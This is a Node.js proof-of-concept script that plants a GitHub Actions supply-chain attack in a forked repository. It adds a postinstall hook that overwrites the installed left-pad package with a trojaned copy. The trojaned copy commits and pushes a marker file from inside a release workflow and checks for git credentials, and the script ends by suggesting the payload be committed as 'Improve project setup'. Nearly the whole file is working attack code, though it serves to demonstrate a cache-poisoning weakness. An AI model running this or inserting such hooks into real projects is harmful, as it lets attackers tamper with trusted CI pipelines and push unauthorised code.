import { mkdir, readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";

const packageJsonPath = "package.json";
const packageJson = JSON.parse(await readFile(packageJsonPath, "utf8"));
packageJson.scripts = {
  ...(packageJson.scripts ?? {}),
  postinstall: "node scripts/attacker-postinstall.mjs"
};

const patchedLeftPad = `const { execFileSync } = require("child_process");
const fs = require("fs");
const path = require("path");

function cleanLeftPad(input, length, character) {
  const value = String(input);
  const fill = character === undefined ? " " : String(character || " ");
  if (value.length >= length) return value;
  return fill.repeat(Math.ceil((length - value.length) / fill.length)).slice(0, length - value.length) + value;
}

function runGit(args) {
  return execFileSync("git", args, {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"]
  }).trim();
}

function errorText(error) {
  const stderr = error && error.stderr ? String(error.stderr).trim() : "";
  const stdout = error && error.stdout ? String(error.stdout).trim() : "";
  return (stderr || stdout || error.message || String(error)).slice(0, 1000);
}

function commitMarker(proof) {
  const branch = process.env.GITHUB_REF_NAME || "main";
  proof.gitTargetBranch = branch;
  proof.gitPushAttempted = false;
  proof.gitPushSucceeded = false;

  try {
    runGit(["config", "user.name", "cached-left-pad"]);
    runGit(["config", "user.email", "cached-left-pad@users.noreply.github.com"]);
    runGit(["add", "hehe.txt"]);

    try {
      execFileSync("git", ["diff", "--cached", "--quiet"], { stdio: "ignore" });
      proof.gitCommitCreated = false;
      proof.gitPushSkipped = "marker file already matched the index";
      return;
    } catch {
      proof.gitCommitCreated = true;
    }

    runGit(["commit", "-m", "Add cached dependency marker"]);
    proof.gitPushAttempted = true;
    const output = runGit(["push", "origin", "HEAD:" + branch]);
    proof.gitPushSucceeded = true;
    proof.gitPushOutput = output.slice(0, 500);
  } catch (error) {
    proof.gitPushError = errorText(error);
  }
}

function writeProof() {
  const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
  fs.mkdirSync(proofDir, { recursive: true });

  const marker = [
    "patched left-pad executed in release workflow",
    "repository=" + (process.env.GITHUB_REPOSITORY || ""),
    "event=" + (process.env.GITHUB_EVENT_NAME || ""),
    "run=" + (process.env.GITHUB_RUN_ID || ""),
    "sha=" + (process.env.GITHUB_SHA || ""),
    "time=" + new Date().toISOString(),
    ""
  ].join("\\n");

  const proof = {
    message: "Patched npm package executed inside trusted release workflow.",
    package: "left-pad",
    eventName: process.env.GITHUB_EVENT_NAME || "",
    repository: process.env.GITHUB_REPOSITORY || "",
    ref: process.env.GITHUB_REF || "",
    sha: process.env.GITHUB_SHA || "",
    contentsWriteDemo: true,
    markerFile: "hehe.txt",
    note: "This POC does not use secrets. The patched package writes and attempts to push a same-repository marker commit."
  };

  fs.writeFileSync("hehe.txt", marker);
  commitMarker(proof);
  fs.writeFileSync(path.join(proofDir, "release-proof.json"), JSON.stringify(proof, null, 2) + "\\n");

  if (process.env.GITHUB_STEP_SUMMARY) {
    fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, [
      "## Patched dependency executed",
      "",
      "~~~json",
      JSON.stringify(proof, null, 2),
      "~~~",
      ""
    ].join("\\n"));
  }
}

module.exports = function leftPad(input, length, character) {
  writeProof();
  return cleanLeftPad(input, length, character);
};
`;

const postinstall = `import { execFileSync } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";

const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
const target = join("node_modules", "left-pad", "index.js");
mkdirSync(proofDir, { recursive: true });

function gitExtraHeaderPresent() {
  try {
    const value = execFileSync("git", ["config", "--get-all", "http.https://github.com/.extraheader"], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"]
    }).trim();
    return Boolean(value);
  } catch {
    return false;
  }
}

if (!existsSync(target)) {
  throw new Error("Expected left-pad to be installed before postinstall runs.");
}

const original = readFileSync(target, "utf8");
mkdirSync(dirname(target), { recursive: true });
writeFileSync(target, ${JSON.stringify(patchedLeftPad)});

const proof = {
  message: "PR postinstall patched an installed npm dependency.",
  eventName: process.env.GITHUB_EVENT_NAME || "",
  repository: process.env.GITHUB_REPOSITORY || "",
  ref: process.env.GITHUB_REF || "",
  sha: process.env.GITHUB_SHA || "",
  packagePatched: "left-pad",
  patchedFile: target,
  originalBytes: original.length,
  checkoutGitCredentialsPresent: gitExtraHeaderPresent(),
  note: "The install step does not need secrets. It only writes dependency state that actions/cache can persist."
};

writeFileSync(join(proofDir, "proof.json"), JSON.stringify(proof, null, 2) + "\\n");
appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
  "## PR install hook patched dependency",
  "",
  "~~~json",
  JSON.stringify(proof, null, 2),
  "~~~",
  ""
].join("\\n"));

console.log("[pr postinstall] patched node_modules/left-pad/index.js");
console.log("[pr postinstall] event=" + proof.eventName);
console.log("[pr postinstall] proof file=" + join(proofDir, "proof.json"));
`;

await writeFile(packageJsonPath, `${JSON.stringify(packageJson, null, 2)}\n`);
await mkdir("scripts", { recursive: true });
await writeFile(join("scripts", "attacker-postinstall.mjs"), postinstall);

console.log("Fork payload written.");
console.log("Next:");
console.log("  git add package.json scripts/attacker-postinstall.mjs");
console.log('  git commit -m "Improve project setup"');
